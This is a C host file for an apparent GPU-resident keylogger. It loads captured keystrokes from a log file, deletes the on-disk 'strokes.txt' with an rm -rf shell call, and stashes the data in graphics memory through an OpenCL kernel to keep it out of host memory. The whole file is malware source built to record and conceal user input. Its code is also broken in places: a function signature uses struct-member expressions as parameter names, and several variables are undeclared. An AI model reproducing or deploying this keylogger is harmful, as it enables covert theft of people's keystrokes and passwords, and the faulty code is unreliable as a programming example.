/* Host file */

#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <CL/cl.h>

#include "demon.h"

/* Get GPU device */
cl_device_id create_device(){
    /* Check Platform */
    err = clGetPlatformIDs(1, &jelly->platform, NULL);
    if(err < 0){
        perror("Couldn't identify platform");
        exit(1);
    }

    /* Access device */
    err = clGetDeviceIDs(jelly->platform, CL_DEVICE_TYPE_GPU, 1, &jelly->dev, NULL);
    if(err == CL_DEVICE_NOT_FOUND){
        perror("Couldn't access GPU device!");
	exit(1);
    }

    return jelly->dev;
}

/* Create program from a file (demon.cl) then compile */
cl_program build_program(jelly->ctx, jelly->dev, const char *filename){
    FILE *program_handle;
    char *program_buf, *program_log;
    size_t program_size, log_size;

    /* Place content from device.cl into buffer */
    program_handle = fopen(filename, "r");
    if(program_handle == NULL){
        perror("Couldn't read file");
	exit(1);
    }
    fseek(program_handle, 0, SEEK_END);
    program_size = ftell(program_handle);
    rewind(program_handle);
    program_buf = (char *)malloc(program_size + 1); // extra space
    program_buf[program_size] = '\0';  // null at end
    fread(program_buf, sizeof(char), program_size, program_handle);
    fclose(program_handle);

    /* Create program from file */
    jelly->program = clCreateProgramWithSource(jelly->ctx, 1, (const char**)&program_buf, &program_size, &err);
    if(err < 0){
        perror("Couldn't create program");
        exit(1);
    }
    free(program_buf);

    /* Build program */
    err = clBuildProgram(jelly->program, 0, NULL, NULL, NULL, NULL);
    if(err < 0){
        /* Find and print size of log */
        clGetProgramBuildInfo(jelly->program, jelly->dev, CL_PROGRAM_BUILD_LOG, 0, NULL, &log_size);
	program_log = (char *)malloc(log_size + 1); // extra space
	program_log[log_size] = '\0';  // null at end
	clGetProgramBuildInfo(jelly->program, jelly->dev, CL_PROGRAM_BUILD_LOG, log_size+1, program_log, NULL);
	printf("%s\n", program_log);
        free(program_log);
	exit(1);
    }

    return jelly->program;
}

int main(int argc, char **argv){
FILE *f;
f = fopen(keylog, "r");
fseek(f, 0, SEEK_SET);
fread(buffer, VRAM_LIMIT, 1, f);
fclose(f);

system("rm -rf strokes.txt");

/* Create device and context */
jelly->dev = create_device();
jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
if(err < 0){
    perror("Couldn't create context");
    exit(1);
}

/* Build program */
jelly->program = build_program(jelly->ctx, jelly->dev, GPU_LOGGER);  // demon.cl

/* Create data buffer */
in = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR,
			      VRAM_LIMIT * sizeof(char), buf, &err);
out = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR,
			    VRAM_LIMIT * sizeof(char), buf2, &err);
if(err < 0){
    perror("Couldn't create logging buffer"); 
    exit(1);
};

/* Create command queue */
jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
if(err < 0){
    perror("Couldn't create command queue");
    exit(1);
};

/* Create kernel */
jelly->kernel = clCreateKernel(jelly->program, KERNEL_FUNC, &err);  // store_keys_gpu(..)
if(err < 0){
    perror("Couldn't create kernel");
    exit(1);
};

/* Kernel arguments */
err = clSetKernelArg(jelly->kernel, 0, sizeof(cl_mem), &in);
err |= clSetKernelArg(jelly->kernel, 1, sizeof(cl_mem), &out);
if(err < 0){
    perror("Couldn't create kernel argument");
    exit(1);
}

/* Enqueue kernel */
err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernel, 1, NULL, &global_size, &local_size, 0, NULL, NULL);
if(err < 0){
    perror("Couldn't enqueue kernel");
    exit(1);
}

/* Read kernel's output */
err = clEnqueueReadBuffer(jelly->cq, out, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
if(err < 0){
    perror("Couldn't read buffer");
    exit(1);
} else{
    printf("%s\n", buffer);
}

/* Free memory */
clReleaseKernel(jelly->kernel);
clReleaseMemObject(out);
clReleaseMemObject(in);
clReleaseCommandQueue(jelly->cq);
clReleaseProgram(jelly->program);
clReleaseContext(jelly->ctx);
}